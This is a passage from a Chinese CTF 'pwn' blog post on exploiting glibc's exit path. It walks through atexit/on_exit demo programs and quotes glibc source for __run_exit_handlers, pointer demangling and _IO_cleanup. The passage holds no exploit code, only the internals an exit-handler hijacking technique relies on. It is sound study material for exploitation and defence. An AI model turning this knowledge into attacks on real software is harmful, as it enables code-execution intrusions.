alt="image-20250910193208482"></p><ul><li>接下来再注册一个带参数的函数。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int on_exit(void (* function) (int void*), void *arg);</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_atexit2</span><span class="params">(<span class="type">int</span> status,<span class="type">void</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bye~ %s\n&quot;</span>,(<span class="type">char</span>*)s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *msg = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (on_exit(my_atexit2,msg) !=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;atexit() error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This program is over\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910194011806.png" alt="image-20250910194011806"></p><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910194054142.png" alt="image-20250910194054142"></p><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910194112657.png" alt="image-20250910194112657"></p><ul><li>第三个就不举例了，接下来还需要看看，如果函数注册满了<code>32</code>个之后，还有函数需要注册那么这些函数会放在哪里呢？下面这个程序探究一下这个。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_atexit1</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is my_atexit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (atexit(my_atexit1) !=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;atexit() error\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This program is over\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>调试情况如下，当超过<code>32</code>个的时候，再进行函数的注册就会申请堆块用做后续的注册。</li></ul><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910195402776.png" alt="image-20250910195402776"></p><ul><li>而这个堆块的<code>next</code>指针，指向的是<code>initial</code>这个结构体，也就是位于<code>glibc</code>中的<code>exit_function_list</code>。所以从某种程度上说明了后注册的函数先被调用。当只有<code>initial</code>这个结构体存在，还是后被注册的函数先被执行。</li></ul><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910195639862.png" alt="image-20250910195639862"></p><h2 id="exit函数源码">exit函数源码</h2><ul><li>源码如下：首先是一个简单的封装<code>exit()</code>函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><ul><li>接下来就是<code>__run_exit_handlers()</code>函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">     atexit/on_exit registrations.  */</span></span><br><span class="line">  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">      <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ef_free:</span><br><span class="line">    <span class="keyword">case</span> ef_us:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_on:</span><br><span class="line">      onfct = f-&gt;func.on.fn;</span><br><span class="line">      arg = f-&gt;func.on.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      onfct (status, arg);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_at:</span><br><span class="line">      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      atfct ();</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment"> we must mark this function as ef_free.  */</span></span><br><span class="line">      f-&gt;flavor = ef_free;</span><br><span class="line">      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">      arg = f-&gt;func.cxa.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      cxafct (arg, status);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">       more exit functions.  Start the loop over.  */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line"><span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">   allocate element.  */</span></span><br><span class="line"><span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="__call_tls_dtors">__call_tls_dtors</h3><ul><li>首先会调用一个比较关键的函数<code>__call_tls_dtors ()</code>，该函数与<strong>线程局部存储</strong>有关。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先调用TLS析构函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br></pre></td></tr></table></figure><h3 id="调用注册函数">调用注册函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">        <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">            <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">            <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">            <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> ef_free:</span><br><span class="line">            <span class="keyword">case</span> ef_us:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ef_on:</span><br><span class="line">              onfct = f-&gt;func.on.fn;</span><br><span class="line">              arg = f-&gt;func.on.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">              PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">              onfct (status, arg);</span><br><span class="line">              __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">                </span><br><span class="line">    <span class="keyword">case</span> ef_at:</span><br><span class="line">              atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">              PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">              atfct ();</span><br><span class="line">              __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">case</span> ef_cxa:</span><br><span class="line">              f-&gt;flavor = ef_free;</span><br><span class="line">              cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">              arg = f-&gt;func.cxa.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">              PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">              cxafct (arg, status);</span><br><span class="line">              __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    *listp = cur-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line"><span class="built_in">free</span> (cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="刷新io缓冲区">刷新IO缓冲区</h3><ul><li>最后在<code>_exit(status)</code>执行之间还会有<code>RUN_HOOK (__libc_atexit, ());</code>，我们会在<code>/libio/genops.c</code>中找到<code>__libc_atexit</code>这个函数。这里还出现了<code>_IO_cleanup</code>以及<code>text_set_element</code>宏定义</li><li>而<code>__libc_atexit</code>其实是位于libc中的一个段（即一块内存空间，该空间名为<code>__libc_atexit</code>）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text_set_element(__libc_atexit, _IO_cleanup);</span><br></pre></td></tr></table></figure><ul><li>而这个宏定义出现在<code>glibc-2.35\glibc-2.35\include\libc-symbols.h</code></li><li>这个宏定义其实就是将<code>_IO_cleanup</code>，写入到<code>__libc_atexit</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Make SYMBOL, which is in the text segment, an element of SET.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> text_set_element(set, symbol)_elf_set_element(set, symbol)</span></span><br></pre></td></tr></table></figure><ul><li>最后在回到<code> RUN_HOOK (__libc_atexit, ());</code>这个位置其实就很好理解了。这个代码其实执行的就是<code>_IO_cleanup</code>。</li><li>而<code>_IO_cleanup</code>会调用<code>_IO_flush_all_lockp (0);</code>是刷新已经打开的流，并在需要的时候上一个锁机制。还会调用<code>_IO_unbuffer_all ();</code>用于将所有打开的流的缓冲模式变成无缓冲模式，然后将缓冲区进行释放。</li><li><code>_IO_unbuffer_all ()、_IO_flush_all_lockp (0)</code>这两个函数都是<code>IO</code>函数，在调试<code>exit()</code>的时候就不需要仔细调试，可以放在调试<code>IO</code>的时候仔细调试。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>下面这个是<code>_IO_flush_all_lockp</code>的代码。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">        run_fp = fp;</span><br><span class="line">        <span class="keyword">if</span> (do_lock)</span><br><span class="line">            _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">        || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">        )</span><br><span class="line">        &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (do_lock)</span><br><span class="line">            _IO_funlockfile (fp);</span><br><span class="line">        run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">    _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>下面这个就是<code>_IO_unbuffer_all ();</code>的源码。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> legacy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (_IO_vtable_offset (fp) != <span class="number">0</span>))</span><br><span class="line">        legacy = <span 